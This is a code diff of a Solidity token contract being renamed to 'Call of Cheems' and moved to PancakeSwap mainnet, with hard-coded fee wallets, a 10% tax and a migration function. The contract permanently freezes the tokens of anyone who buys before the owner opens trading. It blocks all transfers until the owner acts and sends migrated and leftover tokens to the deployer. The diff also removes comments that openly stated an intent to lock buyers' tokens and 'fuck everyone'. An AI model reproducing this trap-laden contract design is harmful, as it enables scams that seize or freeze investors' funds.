@@ -41,7 +41,7 @@
 |  \____/ \__,_||_||_|  \___/ |_|    \____/|_| |_| \___| \___||_| |_| |_||___/ |
 \******************************************************************************/    
 
-pragma solidity 7.8.0;
+pragma solidity >=0.8.12 <0.9.0;
 
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
@@ -84,14 +84,6 @@ interface IUniswapV2Router01 {
 
     function WETH() external pure returns (address);
 
-    function swapExactTokensForETH(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-
     function addLiquidityETH(
         address token,
         uint256 amountTokenDesired,
@@ -109,24 +101,34 @@ interface IUniswapV2Router01 {
         );
 }
 
+interface IUniswapV2Router02 is IUniswapV2Router01 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
 interface IUniswapV2Factory {
     function createPair(address tokenA, address tokenB)
         external
         returns (address pair);
 }
 
-contract FFFAAAA is IERC20 {
+contract CallofCheems is IERC20 {
     using SafeMath for uint256;
     using SafeMath for uint8;
 
-    string public constant name;
-    string public constant symbol;
-    uint8 public constant decimals;
+    string public name;
+    string public symbol;
+    uint8 public decimals;
     uint256 public totalSupply;
 
-    address public MARKETINGWALLET = address(this); // CHANGE
-    address public OPERATIONSWALLET = address(this); // CHANGE
-    address public AUTOLPRECEIVERWALLET = address(this); // CHANGE
+    address public MARKETINGWALLET = 0xf8c80cFf4c49DBfBD2aad7f037B9A07E0e46898E; // CHANGE
+    address public OPERATIONSWALLET = 0xB81b0d2796b36f11F21C217B56aA22437d0e9493; // CHANGE
+    address public AUTOLPRECEIVERWALLET = 0x000000000000000000000000000000000000dEaD; // CHANGE
     uint256 public THRESHOLD;
     uint256 public MAXWALLET;
     uint256 public MAXTRANSACTION;
@@ -142,11 +144,9 @@ contract FFFAAAA is IERC20 {
     mapping(address => bool) private isEarlyTrader;
 
     address private _owner = address(0);
-    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
 
-    IUniswapV2Router01 public uniswapV2Router;
+    IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
-    uint256 private migratedFunds;
     bool inLiquidate;
     bool tradingOpen;
     bool migrationOpen;
@@ -167,28 +167,25 @@ contract FFFAAAA is IERC20 {
     event AddPair(address _pair);
     event OpenTrading(bool tradingOpen);
     event RemoveEarlyTrader(address _earlyTrader);
+    event Migrate(address receiver, uint256 tokensSent);
+    event LunchReady();
 
     constructor() {
-        name = "CCCCCKKKKKk";
-        symbol = "FACK";
+        name = "Call of Cheems";
+        symbol = "COC";
         decimals = 8;
-        totalSupply = 1000000 * 10**8;
-
+        
         _deployer = msg.sender;
-        _tax = Tax(40, 30, 30, 10); //4% marketing, 3% operations, 3% liquidity, 10% total tx fee
+        _tax = Tax(40, 40, 20, 10); //4% marketing, 4% operations, 2% liquidity, 10% total tx fee
         _update(address(0), address(this), 1000000 * 10**8);
-        // TESTNET
-        uniswapV2Router = IUniswapV2Router01(
-            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
-        );
 
-        //uniswapV2Router = IUniswapV2Router01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                 address(this),
                 uniswapV2Router.WETH()
             );
 
-        THRESHOLD = totalSupply.mul(25000).div(100000); //0.25% swap threshold
+        THRESHOLD = totalSupply.div(1000); //0.1% swap threshold
         MAXWALLET = totalSupply.mul(2).div(100); //2% max wallet
         MAXTRANSACTION = totalSupply.div(100); //1% max transaction
 
@@ -198,8 +195,8 @@ contract FFFAAAA is IERC20 {
         isExempt[msg.sender] = true;
         isExempt[address(this)] = true;
 
-        allowance[address(this)][address(uniswapV2Pair)] = totalSupply;
-        allowance[address(this)][address(uniswapV2Router)] = totalSupply;
+        allowance[address(this)][address(uniswapV2Pair)] = type(uint256).max;
+        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;
 
         migrationOpen = true;
     }
@@ -257,73 +254,59 @@ contract FFFAAAA is IERC20 {
     ) external override returns (bool) {
         uint256 availableAllowance = allowance[from][msg.sender];
         if (availableAllowance < type(uint256).max) {
-            allowance[from][msg.sender] = availableAllowance.sub(
-                amount,
-                "insufficient allowance"
-            );
+            allowance[from][msg.sender] = availableAllowance.sub(amount);
         }
 
         return _transferFrom(from, to, amount);
     }
 
     function migrate() external returns(bool){
-        require(migrationOpen);
-        IERC20 oldToken = IERC(oldTokenAddress);
+        require(migrationOpen);    
+        IERC20 oldToken = IERC20(oldTokenAddress);
 
-        tokensSent = oldToken.balanceOf(msg.sender);
-        require(tokensSent > 0);
+        uint256 tokensSent = oldToken.balanceOf(msg.sender);
+
+        require(tokensSent > 0 && (balanceOf[msg.sender].add(tokensSent) <= MAXWALLET));
         require(oldToken.transferFrom(msg.sender, _deployer, tokensSent));
 
-        require(_transferFrom(address(this), msg.sender, amount));
-        migratedFunds = migratedFunds.add(amount);
-        emit Migrate(to, amount);
+        require(_update(address(this), msg.sender, tokensSent));
+        emit Migrate(msg.sender, tokensSent);
         
         return(true);
     }
 
-    function _transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) private returns (bool) {
+    function _transferFrom(address from, address to, uint256 amount) private returns (bool) {
+        require(!migrationOpen);
+
         if (inLiquidate || isExempt[from] || isExempt[to]) {
-            // We are either swapping or there's no need to pay taxes
             return _update(from, to, amount);
         }
 
         uint256 fee;
-        // this will lock the blacklisted tokens
-        require(!(isEarlyTrader[from] || isEarlyTrader[to]), "beep boop");
+        require(!(isEarlyTrader[from] || isEarlyTrader[to]));
 
         (bool fromPair, bool toPair) = (isPair[from], isPair[to]);
         if (!tradingOpen && fromPair) {
-            // The pair transfers tokens out of the liquidity pool, so looking at a blacklistable purchase?
             isEarlyTrader[to] = true;
         }
 
         if (fromPair || toPair) {
-            // looking at a sell or a purchase
-            require((amount <= MAXTRANSACTION), "maxTx");
+            require((amount <= MAXTRANSACTION));
             fee = amount.mul(_tax.txFee).div(100);
         }
 
         if (!toPair) {
-            // ... it's not a sell
-            require((balanceOf[to].add(amount)) <= MAXWALLET, "maxWallet");
+            require((balanceOf[to].add(amount)) <= MAXWALLET);
         }
 
         if (balanceOf[address(this)] >= THRESHOLD && !fromPair) {
-            // it's a sell or transfer, so let's fuck everyone some more
             _liquidate();
         }
 
         balanceOf[address(this)] = balanceOf[address(this)].add(fee);
-        balanceOf[from] = balanceOf[from].sub(
-            amount,
-            "insufficient balance FROM"
-        );
+        balanceOf[from] = balanceOf[from].sub(amount);
         balanceOf[to] = balanceOf[to].add(
-            amount.sub(fee, "insufficient amount left to send")
+            amount.sub(fee)
         );
 
         emit Transfer(from, to, amount);
@@ -336,10 +319,7 @@ contract FFFAAAA is IERC20 {
         uint256 amount
     ) private returns (bool) {
         if (from != address(0)) {
-            balanceOf[from] = balanceOf[from].sub(
-                amount,
-                "insufficient balance FROM"
-            );
+            balanceOf[from] = balanceOf[from].sub(amount);
         } else {
             totalSupply = totalSupply.add(amount);
         }
@@ -355,37 +335,31 @@ contract FFFAAAA is IERC20 {
     function _liquidate() private lockLiquidate {
         uint256 liqTax2 = uint256(_tax.liquidityTax).div(2);
         uint256 tokensForLiquidity = THRESHOLD.mul(liqTax2).div(100);
-        uint256 tokensToSwap = THRESHOLD.sub(tokensForLiquidity.div(2));
+        uint256 tokensToSwap = THRESHOLD.sub(tokensForLiquidity);
+
         uint256 availableBeans = 0;
+  
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
 
-        {
-            address[] memory path = new address[](2);
-            path[0] = address(this);
-            path[1] = uniswapV2Router.WETH();
-
-            availableBeans = uniswapV2Router.swapExactTokensForETH(
-                tokensToSwap,
-                0,
-                path,
-                address(this),
-                block.timestamp + 15
-            )[1];
-            require(availableBeans > 0, "received no beans for swap");
-        }
-        uint256 bnbForMarketing = availableBeans.mul(_tax.marketingTax).div(
-            100
-        );
-        uint256 bnbForOperations = availableBeans.mul(_tax.operationsTax).div(
-            100
-        );
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokensToSwap,
+            0,
+            path,
+            address(this),
+            block.timestamp
+            );
+        availableBeans = address(this).balance;
+        
+        uint256 bnbForMarketing = availableBeans.mul(_tax.marketingTax).div(100);
+        uint256 bnbForOperations = availableBeans.mul(_tax.operationsTax).div(100);
         uint256 bnbForLiquidity = availableBeans.mul(liqTax2).div(100);
 
-        (bool succ, ) = payable(MARKETINGWALLET).call{value: bnbForMarketing}(
-            ""
-        );
+        (bool succ, ) = payable(MARKETINGWALLET).call{value: bnbForMarketing, gas: 30000}("");
         require(succ);
 
-        (succ, ) = payable(OPERATIONSWALLET).call{value: bnbForOperations}("");
+        (succ, ) = payable(OPERATIONSWALLET).call{value: bnbForOperations, gas: 30000}("");
         require(succ);
 
         if (tokensForLiquidity > 0) {
@@ -399,7 +373,7 @@ contract FFFAAAA is IERC20 {
                 AUTOLPRECEIVERWALLET,
                 block.timestamp + 15
             );
-            require(receivedLP > 0, "received no liquidity.. ?");
+            require(receivedLP > 0);
         }
 
         emit Liquidate(
@@ -456,31 +430,6 @@ contract FFFAAAA is IERC20 {
         emit Transfer(address(this), MARKETINGWALLET, contractBnbBalance);
     }
 
-    function readyLunch() external protected {
-        migrationOpen = false;
-        IERC20 oldToken = IERC(oldTokenAddress);
-        uint256 oldTokensToSwap = oldToken.balanceOf(address[this]);
-
-        address[] memory path = new address[](2);
-        path[0] = oldTokenAddress;
-        path[1] = uniswapV2Router.WETH();
-
-        uniswapV2Router.swapExactTokensForETH(
-                oldTokensToSwap,
-                0,
-                path,
-                address(this),
-                block.timestamp + 15
-            )[1];
-        uint256 contractBnbBalance = address(this).balance;
-
-        require(_update(address(this), _deployer, balanceOf[address(this)]));
-        (bool sent, ) = payable(_reployer).call{
-                value: contractBnbBalance
-            }("");
-            require(sent);
-    }
-
     function manualLiquidate() external protected {
         require(balanceOf[address(this)] >= THRESHOLD);
         _liquidate();
@@ -490,7 +439,7 @@ contract FFFAAAA is IERC20 {
         external
         protected
     {
-        require(numberOfTokens <= totalSupply, "too high threshold");
+        require(numberOfTokens <= totalSupply);
         THRESHOLD = numberOfTokens;
     }
 
@@ -525,128 +474,13 @@ contract FFFAAAA is IERC20 {
         emit RemoveEarlyTrader(_earlyTrader);
     }
 
-    /*function initLiquidity() external payable protected {
-        IWETH WBNB = IWETH(uniswapV2Router.WETH());
-        IWETH(WBNB).deposit{value: msg.value}();
-        require(
-            IWETH(WBNB).transfer(uniswapV2Pair, msg.value),
-            "transfering WBNB failed?!"
-        );
-        balanceOf[uniswapV2Pair] = totalSupply;
+    function readyLunch() external protected {
+        require(migrationOpen == true);
+        migrationOpen = false;
+        _update(address(this), _deployer, balanceOf[address(this)]);
 
-        require(
-            IUniswapV2Pair(uniswapV2Pair).mint(msg.sender) > 0,
-            "did not receive any liquidity for purchase"
-        );
+        emit LunchReady();
     }
 }
 
-interface IUniswapV2Pair {
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    function name() external pure returns (string memory);
-
-    function symbol() external pure returns (string memory);
-
-    function decimals() external pure returns (uint8);
-
-    function totalSupply() external view returns (uint256);
-
-    function balanceOf(address owner) external view returns (uint256);
-
-    function allowance(address owner, address spender)
-        external
-        view
-        returns (uint256);
-
-    function approve(address spender, uint256 value) external returns (bool);
-
-    function transfer(address to, uint256 value) external returns (bool);
-
-    function transferFrom(
-        address from,
-        address to,
-        uint256 value
-    ) external returns (bool);
-
-    function DOMAIN_SEPARATOR() external view returns (bytes32);
-
-    function PERMIT_TYPEHASH() external pure returns (bytes32);
-
-    function nonces(address owner) external view returns (uint256);
-
-    function permit(
-        address owner,
-        address spender,
-        uint256 value,
-        uint256 deadline,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external;
-
-    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
-    event Burn(
-        address indexed sender,
-        uint256 amount0,
-        uint256 amount1,
-        address indexed to
-    );
-    event Swap(
-        address indexed sender,
-        uint256 amount0In,
-        uint256 amount1In,
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address indexed to
-    );
-    event Sync(uint112 reserve0, uint112 reserve1);
-
-    function MINIMUM_LIQUIDITY() external pure returns (uint256);
-
-    function factory() external view returns (address);
-
-    function token0() external view returns (address);
-
-    function token1() external view returns (address);
-
-    function getReserves()
-        external
-        view
-        returns (
-            uint112 reserve0,
-            uint112 reserve1,
-            uint32 blockTimestampLast
-        );
-
-    function price0CumulativeLast() external view returns (uint256);
-
-    function price1CumulativeLast() external view returns (uint256);
-
-    function kLast() external view returns (uint256);
-
-    function mint(address to) external returns (uint256 liquidity);
-
-    function burn(address to)
-        external
-        returns (uint256 amount0, uint256 amount1);
-
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes calldata data
-    ) external;
-
-    function skim(address to) external;
-
-    function sync() external;
-
-    function initialize(address, address) external;
-}*/
-
+ 
